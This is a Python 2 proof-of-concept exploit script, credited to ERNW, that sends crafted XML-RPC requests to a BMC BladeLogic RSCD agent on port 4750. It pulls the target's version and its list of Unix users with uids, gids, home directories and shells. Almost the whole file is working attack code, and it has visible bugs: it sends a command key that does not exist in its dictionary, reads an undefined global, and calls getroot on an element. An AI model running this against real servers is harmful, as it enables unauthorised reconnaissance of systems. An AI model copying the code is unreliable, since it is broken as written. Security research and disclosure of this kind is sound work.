# Retrieving system users with BMC BladeLogic RSCD agent (checked for v8.6.01.66)
# Copyright: ERNW

from RSCDAdapter import RSCDAdapter
import socket
import ssl
import sys
import requests
import argparse
import xml.etree.ElementTree as ET

# Commands
c = {"init":"""<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>RemoteServer.intro</methodName><params><param><value>2015-11-19-16-10-30-3920958</value></param><param><value>7</value></param><param><value>0;0;21;AArverManagement_XXX_XXX:XXXXXXXX;2;CM;-;-;0;-;1;1;6;SYSTEM;CP1252;</value></param><param><value>8.6.01.66</value></param></params></methodCall>""",\
			"getVersion":"""<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>RemoteServer.getVersion</methodName><params/></methodCall>""",\
			"getUsers":"""<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>DAAL.getAssetChildrenStream</methodName><params><param><value><struct><member><name>typeName</name><value>BMC_UnixUsers</value></member><member><name>host</name><value>0.0.0.0</value></member><member><name>container</name><value><array><data><value><struct><member><name>string</name><value>IS_LIVE</value></member><member><name>value</name><value><struct><member><name>longValue</name><value><ex:i8>1</ex:i8></value></member><member><name>kind</name><value><i4>1</i4></value></member></struct></value></member></struct></value></data></array></value></member><member><name>path</name><value>/</value></member></struct></value></param><param><value><i4>1</i4></value></param><param><value><array><data/></array></value></param><param><value><array><data/></array></value></param><param><value><array><data/></array></value></param></params></methodCall>""",\
			"getNext":"""<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>DAAL.assetStreamGetNext</methodName><params><param><value><struct><member><name>streamID</name><value><struct><member><name>sessionId</name><value><i4>2</i4></value></member></struct></value></member></struct></value></param><param><value><i4>100</i4></value></param></params></methodCall>""",\
			"closeAsset":"""<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>DAAL.assetStreamClose</methodName><params><param><value><struct><member><name>streamID</name><value><struct><member><name>sessionId</name><value><i4>2</i4></value></member></struct></value></member></struct></value></param></params></methodCall>"""}

def optParser():
	parser = argparse.ArgumentParser(description="Retrieving system users with BMC BladeLogic Server Automation RSCD agent")
	parser.add_argument("host", help="IP address of a target system")
	parser.add_argument("-p", "--port", type=int, default=4750, help="TCP port (default: 4750)")
	opts=parser.parse_args()
	return opts

def send_xmlrpc(cmd):
	r = s.post('https://%s:%s/xmlrpc' % (options.host, options.port), data=cmd)

	return r.content


def parse_version(str):
	rootVersion = ET.fromstring(str)
	print "========================="
	print "Major version: " + rootVersion[0][0][0][0][0][1].text
	print "Minor version: " + rootVersion[0][0][0][0][1][1].text
	print "Patch version: " + rootVersion[0][0][0][0][2][1].text
	print "Platform version: " + rootVersion[0][0][0][0][3][1].text
	print "=========================\n"


def parse_users(str):
	# Parsing the response
	# If parsing does not work correctly, the users' information still can be found in the saved users.xml file
	root = ET.fromstring(str).getroot()
	count = 0
	ind = 1
	while ind:
		try:
			ind = root[0][0][0][0][0][1][0][0][count][0][0][1][0][2][1].text
		except IndexError:
			pass
			break
		count += 1

	print "Number of users found: " + str(count) + "\n"

	for i in range(0, count):
		print "User " + str(i) + ": " + root[0][0][0][0][0][1][0][0][i][0][0][1][0][2][
			1].text + "\n........................"
		print "home directory:" + root[0][0][0][0][0][1][0][0][i][0][1][1][0][2][1][0][0][0][0][1][1][0][1][1].text
		print "uid:" + root[0][0][0][0][0][1][0][0][i][0][1][1][0][2][1][0][0][11][0][1][1][0][1][1][0].text
		print "gid:" + root[0][0][0][0][0][1][0][0][i][0][1][1][0][2][1][0][0][3][0][1][1][0][1][1][0].text
		print "primaryGroupName:" + root[0][0][0][0][0][1][0][0][i][0][1][1][0][2][1][0][0][4][0][1][1][0][1][1].text
		try:
			print "username:" + root[0][0][0][0][0][1][0][0][i][0][1][1][0][2][1][0][0][2][0][1][1][0][1][1].text
		except IndexError:
			pass
		try:
			print "shell:" + root[0][0][0][0][0][1][0][0][i][0][1][1][0][2][1][0][0][10][0][1][1][0][1][1].text
		except IndexError:
			pass
		print "........................\n"


def main():
	global s

	options = optParser()
	s = requests.Session()
	s.mount('https://', RSCDAdapter())

	print "Sending intro..."
	send_xmlrpc(c['intro'])

	print "Getting version..."
	parse_version(send_xmlrpc(c['getVersion']))

	print "Sending request for users...\n"
	send_xmlrpc(c['getUsers'])
	parse_users(send_xmlrpc(c['getNext']))

	send_xmlrpc(c['getNext'])
	send_xmlrpc(c['closeAsset'])

	s.close()

if __name__ == "__main__":
	main()
